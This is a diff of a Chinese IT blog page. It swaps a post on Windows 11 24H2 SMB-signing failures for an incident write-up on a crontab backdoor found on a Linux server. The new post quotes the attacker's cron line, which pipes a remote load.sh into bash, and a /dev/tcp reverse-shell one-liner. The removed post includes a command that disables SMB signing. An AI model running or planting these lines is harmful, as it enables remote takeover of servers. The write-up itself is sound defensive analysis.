@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="zh" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="新装 Win11 24H2 无法访问群晖 NAS 与网络扫描仪共享目录，根因是微软强制开启 SMB 客户端签名，老设备握手被拒。">
-<title>一次 Windows 11 24H2 强制 SMB 签名导致老旧 NAS 与共享设备无法访问的排查实录</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="一台业务服务器周期性向陌生公网 IP 发起连接并伴随 CPU 抖动，顺藤摸瓜发现攻击者在 crontab 植入恶意定时任务实现持久化与反弹 shell，本文还原排查与清剿过程。">
+<title>记一次 Linux 服务器周期性外联与 CPU 抖动：crontab 恶意定时任务后门排查</title>
 
 
-<link rel="canonical" href="https://blog.5772447.xyz/posts/e94be3fc/">
+<link rel="canonical" href="https://blog.5772447.xyz/posts/1de17e40/">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
 
 
-<link rel="stylesheet" href="/scss/style.min.59c5eb617b2b83358d0baf163162325d5249a2be44239b430beb29a87c1ddbe4.css"><meta property='og:title' content="一次 Windows 11 24H2 强制 SMB 签名导致老旧 NAS 与共享设备无法访问的排查实录">
-<meta property='og:description' content="新装 Win11 24H2 无法访问群晖 NAS 与网络扫描仪共享目录，根因是微软强制开启 SMB 客户端签名，老设备握手被拒。">
-<meta property='og:url' content='https://blog.5772447.xyz/posts/e94be3fc/'>
+<link rel="stylesheet" href="/scss/style.min.59c5eb617b2b83358d0baf163162325d5249a2be44239b430beb29a87c1ddbe4.css"><meta property='og:title' content="记一次 Linux 服务器周期性外联与 CPU 抖动：crontab 恶意定时任务后门排查">
+<meta property='og:description' content="一台业务服务器周期性向陌生公网 IP 发起连接并伴随 CPU 抖动，顺藤摸瓜发现攻击者在 crontab 植入恶意定时任务实现持久化与反弹 shell，本文还原排查与清剿过程。">
+<meta property='og:url' content='https://blog.5772447.xyz/posts/1de17e40/'>
 <meta property='og:site_name' content='Zero Day Notes'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SMB' /><meta property='article:tag' content='Windows 11' /><meta property='article:tag' content='24H2' /><meta property='article:tag' content='文件共享' /><meta property='article:tag' content='NAS' /><meta property='article:published_time' content='2026-07-09T07:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-07-09T07:00:00&#43;00:00'/>
-<meta name="twitter:title" content="一次 Windows 11 24H2 强制 SMB 签名导致老旧 NAS 与共享设备无法访问的排查实录">
-<meta name="twitter:description" content="新装 Win11 24H2 无法访问群晖 NAS 与网络扫描仪共享目录，根因是微软强制开启 SMB 客户端签名，老设备握手被拒。">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-07-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-07-15T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="记一次 Linux 服务器周期性外联与 CPU 抖动：crontab 恶意定时任务后门排查">
+<meta name="twitter:description" content="一台业务服务器周期性向陌生公网 IP 发起连接并伴随 CPU 抖动，顺藤摸瓜发现攻击者在 crontab 植入恶意定时任务实现持久化与反弹 shell，本文还原排查与清剿过程。">
     <link rel="shortcut icon" href="/img/favicon.png" />
 
     </head>
@@ -258,8 +258,8 @@
             
             
             
-            <a href="/categories/%E6%A1%8C%E9%9D%A2%E8%BF%90%E7%BB%B4/" style="background-color: hsl(195, 60%, 84%); color: hsl(195, 60%, 15%);">
-                桌面运维
+            <a href="/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/" style="background-color: hsl(190, 60%, 84%); color: hsl(190, 60%, 15%);">
+                安全运维
             </a>
         
     </header>
@@ -267,12 +267,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/posts/e94be3fc/">一次 Windows 11 24H2 强制 SMB 签名导致老旧 NAS 与共享设备无法访问的排查实录</a>
+            <a href="/posts/1de17e40/">记一次 Linux 服务器周期性外联与 CPU 抖动：crontab 恶意定时任务后门排查</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            新装 Win11 24H2 无法访问群晖 NAS 与网络扫描仪共享目录，根因是微软强制开启 SMB 客户端签名，老设备握手被拒。
+            一台业务服务器周期性向陌生公网 IP 发起连接并伴随 CPU 抖动，顺藤摸瓜发现攻击者在 crontab 植入恶意定时任务实现持久化与反弹 shell，本文还原排查与清剿过程。
         </h3>
         
     </div>
@@ -297,7 +297,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                    <time class="article-time--published" datetime='2026-07-09T07:00:00Z'>2026年7月9日星期四</time>
+                    <time class="article-time--published" datetime='2026-07-15T00:00:00Z'>2026年7月15日星期三</time>
                 
 
                 
@@ -355,102 +355,64 @@
     
     
     <h2 id="一问题背景"><a href="#%e4%b8%80%e9%97%ae%e9%a2%98%e8%83%8c%e6%99%af" class="header-anchor"></a>一、问题背景
-</h2><p>公司办公网长期以文件服务器（一台群晖 NAS）作为部门共享盘，同时多台网络扫描仪通过 SMB 把扫描件直接推送到共享目录。内网绝大多数终端还是 Windows 10，访问一直正常。近期采购的一批新笔记本出厂预装 <strong>Windows 11 24H2</strong>，IT 按标准镜像部署后下发到行政、财务等部门。上午刚交付，行政部就反馈：几台新笔记本在资源管理器输入 <code>\\nas\share</code> 直接报错打不开共享，而隔壁老电脑一切正常；与此同时，二楼的旧网络扫描仪把扫描件推到 NAS 时也开始失败。由于当天有合同扫描归档的硬性 deadline，这是一个需要尽快闭环的高优先级故障。</p>
+</h2><p>一台跑内部业务接口的后端服务器（CentOS 7，双核 4G，对内有 Nginx + PHP-FPM，对外仅开放 80/443），平时 CPU 长期在 5% 以下、几乎无主动出网流量。某天早上安全运营中心（SOC）告警：该主机在凌晨到上午频繁向一个陌生境外 IP 的 443 端口发起连接，且主机监控出现每隔几分钟一次的 CPU 小尖峰。由于该服务器按规范不应主动访问任何外部地址，这条告警立即被升级为疑似失陷（compromise）事件，由我介入排查。</p>
 <h2 id="二故障现象"><a href="#%e4%ba%8c%e6%95%85%e9%9a%9c%e7%8e%b0%e8%b1%a1" class="header-anchor"></a>二、故障现象
-</h2><p>新装 Windows 11 24H2 终端的具体表现：</p>
+</h2><p>现场最明显的异常有三点：</p>
 <ol>
-<li>资源管理器地址栏输入 <code>\\192.168.10.20\行政共享</code> 后弹出错误：<strong>“你不能访问此共享，因为它不安全……”</strong> 或 <strong>“Unspecified error (0x80004005)”</strong>，部分机器提示需要 SMB 签名。</li>
-<li>用命令行 <code>net use \\nas\share</code> 连接，返回 <strong>“System error 1240 / 要求的 SMB 签名未协商”</strong>。</li>
-<li><strong>同网段的 Windows 10 电脑访问完全正常</strong>，说明 NAS 本身在服务、权限、网络层面没有宕。</li>
-<li>二楼那台服役多年的网络扫描仪，SMB 推送任务日志持续报错 “connection refused / authentication failed”，扫描件堆积在本地缓存。</li>
-<li>事件查看器 → Windows 日志 → 系统 中出现 <code>SmbClient</code> 相关事件，提示客户端要求的安全特性（签名）未被对端满足。</li>
+<li><strong>周期性出网</strong>：在主机上用 <code>ss -antp</code> 多次采样，每隔约 3 分钟就会出现一条到 <code>45.x.x.x:443</code> 的 <code>ESTABLISHED</code> 连接，几十秒后断开；该 IP 不在任何白名单内，也不属于 CDN 或上游依赖。</li>
+<li><strong>CPU 抖动</strong>：<code>top</code> 里能看到一个生命周期极短的进程（多半是 <code>curl</code>/<code>wget</code>/<code>bash</code>）把单核短暂拉到 60%~90%，随即消失，像是被某调度器周期性唤起。平时毫无业务的高峰低谷符合这种&quot;定时唤醒&quot;特征。</li>
+<li><strong>进程捉迷藏</strong>：<code>top</code>、<code>htop</code> 里看不到常驻的可疑进程，也没有新增的系统服务；但出网连接确实在发生，说明恶意负载要么极短命，要么藏在依赖调度的机制里。</li>
 </ol>
-<p>现象指向一个结论：<strong>旧系统正常、新系统异常，且异常集中在“签名/安全协商”环节</strong>，基本可以锁定是客户端协议策略变化，而非 NAS 宕机或网络不通。</p>
+<p>第一反应是查是否有常驻木马（类似前阵子清掉的 XMRig 挖矿），但 <code>ps aux</code> 全量拉取也只看到正常的 Nginx、PHP-FPM 与 <code>crond</code>，方向一度被带偏。</p>
 <h2 id="三排查过程"><a href="#%e4%b8%89%e6%8e%92%e6%9f%a5%e8%bf%87%e7%a8%8b" class="header-anchor"></a>三、排查过程
-</h2><p><strong>第 1 步：界定范围，排除基础网络。</strong> 先 <code>ping nas</code> 通、<code>Test-NetConnection 192.168.10.20 -Port 445</code> 端口开放，证明 TCP 与网络层没问题；再在 Win10 上同一路径秒开，进一步排除 NAS 共享权限与账号问题。故障被收敛到“Win11 24H2 客户端 ↔ SMB 安全协商”这一段。</p>
-<p><strong>第 2 步：拿到精确错误码。</strong> 在问题机器上执行：</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>net use \\<span style="color:#ae81ff">192.168</span>.10.<span style="color:#ae81ff">20</span>\行政共享 /user<span style="color:#960050;background-color:#1e0010">:</span>domain\admin ********
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 返回：System error 1240 has occurred.</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#       要求的 SMB 签名未协商。</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>错误码 1240 在微软文档里对应的正是 <strong>“The account is not authorized to log in from this station”</strong> 的签名/安全变体——客户端要求签名，但服务端握手时没带签名，客户端于是拒绝。</p>
-<p><strong>第 3 步：核对客户端 SMB 安全配置。</strong> 用 PowerShell 查看本机 SMB 客户端要求：</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-SmbClientConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature, RequireEncryption
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>输出显示 <code>RequireSecuritySignature = True</code>。回忆微软的发布说明：<strong>Windows 11 24H2 起，SMB 客户端签名（SMB signing）默认从“协商”升级为“强制（always）”</strong>，同时进一步收紧不安全的来宾/匿名访问，SMB1 也默认关闭。这正是与老系统（Win10 默认“协商/可选”）行为分叉的点。</p>
-<p><strong>第 4 步：确认对端能力。</strong> 登录群晖 DSM，查看 控制面板 → 文件服务 → SMB → 高级设置，发现该机型固件较旧，<strong>“允许 SMB 签名”未勾选</strong>，且最高协商到 SMB3 但签名能力未启用；而那台旧扫描仪固件更老，仅实现到 SMB1/SMB2 且<strong>根本不支持签名</strong>。于是握手过程变成：Win11 客户端坚持“必须签名” ↔ NAS/扫描仪“不签名或不会签名” → 客户端主动中断，共享打不开。</p>
-<p><strong>第 5 步：抓包佐证。</strong> 在问题机器 Wireshark 抓 <code>tcp.port==445</code>，可以看到 Negotiate Protocol Response 里 <code>SecurityMode</code> 字段没有 <code>SMB2_NEGOTIZE_SIGNING_REQUIRED</code> 的对应能力，而客户端在 Session Setup 时设置了 <code>SIGNING_REQUIRED</code>，随后服务端返回 <code>STATUS_ACCESS_DENIED</code>，连接被拒。到这里根因已经坐实。</p>
-<h2 id="四解决方案"><a href="#%e5%9b%9b%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88" class="header-anchor"></a>四、解决方案
-</h2><p>分“治本”和“临时兼容”两条线处理，当天先止血、再排期根治。</p>
-<p><strong>方案 A（治本，优先）：在对端启用 SMB 签名。</strong></p>
+</h2><p><strong>第 1 步：锁定出网连接与源头进程。</strong> 用 <code>ss -antp | grep -E '45\.'</code> 抓到连接后，记下其 <code>pid</code>，但发现 pid 每次都不同且迅速退出。改用 <code>pidstat -t 1</code> 持续观察，确认有一个进程在固定节律（每 3 分钟）被拉起，父进程是 <code>crond</code> 派生的 <code>sh -c</code>。这就把怀疑对象从&quot;常驻服务&quot;直接指向了<strong>计划任务</strong>。</p>
+<p><strong>第 2 步：翻遍所有 cron 落点。</strong> 攻击者为提高隐蔽性常不只写用户 <code>crontab</code>，于是我把四处都查了一遍：</p>
 <ul>
-<li>群晖 NAS：控制面板 → 文件服务 → SMB → 高级设置 → 勾选 <strong>“允许 SMB 签名”</strong>（建议顺带升级到支持 SMB3 签名的较新 DSM 固件），保存后 Win11 24H2 立刻能正常挂载。</li>
-<li>旧扫描仪：联系厂商升级固件到支持 <strong>SMB3 + 签名</strong> 的版本；若设备已 EOL 无法升级，则改用 <strong>FTP/SFTP</strong> 推送扫描件到一台支持签名的专用中转服务器，再同步进 NAS。</li>
+<li><code>crontab -l -u www</code> 与 <code>crontab -l -u root</code>（以及其它业务账号）；</li>
+<li><code>/etc/crontab</code>；</li>
+<li><code>/etc/cron.d/</code> 下所有片段；</li>
+<li><code>/var/spool/cron/</code> 原始文件。</li>
 </ul>
-<p><strong>方案 B（临时兼容，仅限紧急）：在 Win11 客户端放宽签名要求。</strong></p>
+<p>在 <code>/var/spool/cron/www</code> 里发现一条可疑条目：</p>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># 不推荐长期使用，会削弱安全性</span>
-</span></span><span style="display:flex;"><span>Set-SmbClientConfiguration -RequireSecuritySignature $false -Confirm:$false
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或通过组策略：计算机配置→Windows 设置→安全设置→本地策略→安全选项</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># “Microsoft 网络客户端：对通信进行数字签名(始终)” 设为 已禁用</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#f92672">*/</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span> <span style="color:#f92672">*</span> curl <span style="color:#f92672">-</span>fsSL http:<span style="color:#f92672">//</span><span style="color:#ae81ff">45.</span>x<span style="color:#f92672">.</span>x<span style="color:#f92672">.</span>x<span style="color:#f92672">/</span>x<span style="color:#f92672">/</span>load<span style="color:#f92672">.</span>sh <span style="color:#f92672">|</span> bash <span style="color:#f92672">&gt;/</span>dev<span style="color:#f92672">/</span>null <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">1</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>注意：方案 B 只是给老设备“续命”，正确做法是推动对端支持签名，而不是让新系统退回不安全状态。</p>
-<p><strong>方案 C（长效机制）：用 GPO 统一全司 SMB 基线。</strong> 在域控上新建一条策略，明确 <strong>服务端 + 客户端均启用 SMB 签名</strong>，下发到所有终端，避免逐台手工配置、避免以后再有机器“不一致”。</p>
-<p>当天先对 NAS 开启签名（5 分钟生效）恢复共享，扫描仪走 SFTP 中转应急，行政部合同归档 deadline 解除。</p>
-<h2 id="五根因分析"><a href="#%e4%ba%94%e6%a0%b9%e5%9b%a0%e5%88%86%e6%9e%90" class="header-anchor"></a>五、根因分析
-</h2><p>根因是<strong>协议安全基线的单向演进</strong>：微软在 Windows 11 24H2 把 SMB 客户端签名由“协商可选”改为“强制开启”，目的是抵御 SMB 中继/MitM 类攻击；而内网里大量老旧 NAS 固件、嵌入式扫描仪仍停留在“不支持或未启用签名”的旧实现。当强制签名的客户端遇到不签名的对端，握手被客户端主动拒绝，表现为“共享打不开、扫描推不上去”。这不是网络故障，也不是账号故障，而是<strong>安全能力错配</strong>——新标准的客户端拒绝与不达标老设备对话。</p>
-<h2 id="六预防措施"><a href="#%e5%85%ad%e9%a2%84%e9%98%b2%e6%8e%aa%e6%96%bd" class="header-anchor"></a>六、预防措施
-</h2><ol>
-<li><strong>采购准入</strong>：新购 NAS、网络扫描仪、打印机等带 SMB 功能的设备，合同中明确必须支持 <strong>SMB3 与 SMB 签名</strong>，杜绝 EOL 老固件入网。</li>
-<li><strong>存量治理</strong>：盘点内网所有提供/消费 SMB 的设备，升级固件到支持签名的版本；无法升级的老旧嵌入式设备，迁移到 SFTP/FTP 或专用网关。</li>
-<li><strong>统一策略</strong>：通过域 GPO 固化“服务端+客户端均启用 SMB 签名”的基线，让安全配置一致、可审计，而不是靠每台机器“碰运气”。</li>
-<li><strong>变更预演</strong>：微软每次 Windows 功能版本（如 24H2）上线前，先在隔离测试环境跑一遍“共享访问、打印、扫描推送”等关键路径，提前暴露协议兼容性坑。</li>
-<li><strong>监控告警</strong>：对 NAS 的 SMB 协商失败日志做采集，配合 401/1240 类错误做早期预警，避免等到业务部门大面积报错才被动响应。</li>
+</div><p>把这一段注释掉后再观察，周期性出网与 CPU 抖动<strong>同时消失</strong>，因果关系坐实。</p>
+<p><strong>第 3 步：还原 payload 行为。</strong> 在隔离环境里下载 <code>load.sh</code> 分析，它做了几件事：① 从 C2 拉取第二阶段脚本并 base64 内联，避免落地文件被扫；② 写入 <code> ~/.bashrc</code> 与 <code>/etc/rc.local</code> 做开机自启兜底；③ 尝试用 <code>bash -i &gt;&amp; /dev/tcp/45.x.x.x/9999 0&gt;&amp;1</code> 建立反弹 shell；④ 顺手检查是否有 <code>redis-server</code>/<code>mysql</code> 弱口令可横向。整个过程不写明显进程名、不占端口常驻，正是典型的&quot;低噪声持久化&quot;。</p>
+<p><strong>第 4 步：排查其它落脚点。</strong> 既然已经拿到 <code>www</code> 账号执行权，必须假设攻击者还留了后手：检查 <code>/etc/passwd</code> 是否有新增账号、<code>authorized_keys</code> 是否被追加公钥、是否有新的 systemd timer、以及 web 目录里是否混入了 webshell。本轮只发现 cron 这一条主线，但 <code>bashrc</code>/<code>rc.local</code> 的写入提示初始入侵点需要进一步回溯（见根因）。</p>
+<h2 id="四解决方案"><a href="#%e5%9b%9b%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88" class="header-anchor"></a>四、解决方案
+</h2><p>止血与清剿按&quot;先断链、再清除、后加固&quot;的顺序执行：</p>
+<ol>
+<li><strong>断链</strong>：在边界防火墙与主机 <code>iptables</code> 双重封禁 <code>45.x.x.x</code> 的入向/出向，先掐掉 C2 通信，防止反弹 shell 与二次投递。</li>
+<li><strong>清除</strong>：<code>crontab -r -u www</code> 删除恶意任务，删除 <code>load.sh</code> 及 <code>/tmp</code> 下衍生文件，还原被改写的 <code>~/.bashrc</code> 与 <code>/etc/rc.local</code>。</li>
+<li><strong>kill 残余</strong>：<code>pkill -f load.sh</code>、结束处于 <code>bash -i</code> 反弹态的进程，确认 <code>ss</code> 不再出现外联。</li>
+<li><strong>收口凭证</strong>：因 <code>www</code> 账号曾被执行权限，轮换该账号及同机相关服务的密码/密钥；核查是否有凭据被打包外传（重点关注 <code>~/.ssh</code>、<code>/etc/shadow</code> 最近修改时间）。</li>
+<li><strong>复核持久化</strong>：确认无新增系统账号、<code>authorized_keys</code> 无陌生公钥、无异常 systemd timer 后才视为清剿完成。若评估初始入侵面（如存在 RCE 漏洞的Web应用）难以彻底确认干净，按失陷标准直接重装该主机更稳妥——本次因入侵链清晰、改动有限，采用清除+重建可疑组件方式。</li>
 </ol>
+<h2 id="五根因分析"><a href="#%e4%ba%94%e6%a0%b9%e5%9b%a0%e5%88%86%e6%9e%90" class="header-anchor"></a>五、根因分析
+</h2><p>真正的问题不是 cron 本身，而是<strong>初始入侵点 + 持久化手法</strong>的组合：<code>www</code> 账号或其所托管的 Web 应用存在弱口令/旧漏洞，攻击者借此拿到命令执行权后，没有追求显眼的常驻木马，而是选择 <code>crontab</code> 这种&quot;系统正常组件&quot;做持久化——它不需要新开端口、不新增服务名、日志里只是普通的 cron 执行记录，检测难度远高于 XMRig 这类高 CPU 常驻进程。换言之，cron 后门是用&quot;合法调度框架&quot;打掩护，把检测成本转嫁给了运维。</p>
+<h2 id="六预防措施"><a href="#%e5%85%ad%e9%a2%84%e9%98%b2%e6%8e%aa%e6%96%bd" class="header-anchor"></a>六、预防措施
+</h2><p>针对此类低噪声持久化，单靠&quot;看 top&quot;已经不够，需要从检测与基线两端下手：</p>
+<ul>
+<li><strong>监控 cron 变更</strong>：用 <code>auditd</code> 对 <code>/etc/cron*</code>、<code>/var/spool/cron/</code> 加规则（<code>-w /etc/cron.d -p wa -k cron_change</code>），任何改动进审计日志并告警。</li>
+<li><strong>出网白名单</strong>：服务器默认拒绝所有主动出网，仅放行 Proxy/更新源等少数地址，cron 拉取外网脚本会立即被拦，从根上废掉投递链。</li>
+<li><strong>文件完整性监控（FIM）</strong>：部署 AIDE/Tripwire 或 HIDS（Wazuh/osquery），对 <code>crontab</code>、<code>bashrc</code>、<code>rc.local</code> 做哈希基线，偏差即告警。</li>
+<li><strong>异常血缘检测</strong>：用 osquery 之类持续比对&quot;父进程=crond 却派生出 curl/wget/bash 外联&quot;的异常血缘关系，这是识别 cron 后门最有效的规则之一。</li>
+<li><strong>最小权限与基线</strong>：业务账号禁 <code>crontab</code>、禁出网、禁写 <code>bashrc</code>；定期跑 CIS Benchmark 与弱口令扫描，把初始入侵面压到最低。</li>
+</ul>
 <h2 id="七总结"><a href="#%e4%b8%83%e6%80%bb%e7%bb%93" class="header-anchor"></a>七、总结
-</h2><p>Windows 11 24H2 强制 SMB 签名本身是正确的安全加固，但它把“对内网老旧设备兼容性”的账一次性结清了。这次故障的教训是：<strong>协议安全基线的演进速度，往往快于嵌入式设备的固件更新节奏</strong>。排查时抓住“旧系统正常、新系统异常 + 错误码 1240 + RequireSecuritySignature=True”这三条线索，就能快速定位到签名握手失败，而不是在权限、网络、账号上白绕圈。治本之道永远是在对端补齐签名能力，而不是让新客户端退回不安全状态。</p>
+</h2><p>这次事件的本质，是攻击者用 <code>crontab</code> 这个&quot;系统自带的合法调度器&quot;做持久化，规避了常驻进程的显眼特征，单看 CPU 和进程表很容易误判为偶发抖动。排查的关键转折在于：周期出网 + 短命进程 + 父进程是 <code>crond</code>，三者指向计划任务而非服务；顺藤摸到 <code>/var/spool/cron/</code> 的恶意条目后，问题迎刃而解。对运维来说，与其事后肉眼翻 cron，不如把 cron 变更、出网白名单、异常进程血缘做成常态化检测——让后门在&quot;被调度起来&quot;的那一刻就被抓住。</p>
 
 </section>
 
 
     <footer class="article-meta article-footer">
     
-    <section class="article-tags">
-        
-            <a href="/tags/smb/">SMB</a>
-        
-            <a href="/tags/windows-11/">Windows 11</a>
-        
-            <a href="/tags/24h2/">24H2</a>
-        
-            <a href="/tags/%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/">文件共享</a>
-        
-            <a href="/tags/nas/">Nas</a>
-        
-    </section>
-
 
     </footer>
 
@@ -461,37 +423,6 @@
     
 
     
-
-<aside>
-    <h2 class="section-title">相关文章</h2>
-    <div class="subsection-list">
-        <div class="article-list--tile">
-            
-                
-<article class="">
-    <a href="/posts/8e87c01f/">
-        
-
-        <div class="article-details">
-            <h2 class="article-title">记一次 NAS 权限继承异常导致的跨部门文件访问故障</h2>
-        </div>
-    </a>
-</article>
-            
-                
-<article class="">
-    <a href="/posts/ac8933af/">
-        
-
-        <div class="article-details">
-            <h2 class="article-title">组策略共享权限配错致全公司无法访问共享文件夹</h2>
-        </div>
-    </a>
-</article>
-            
-        </div>
-    </div>
-</aside>
 
      
     
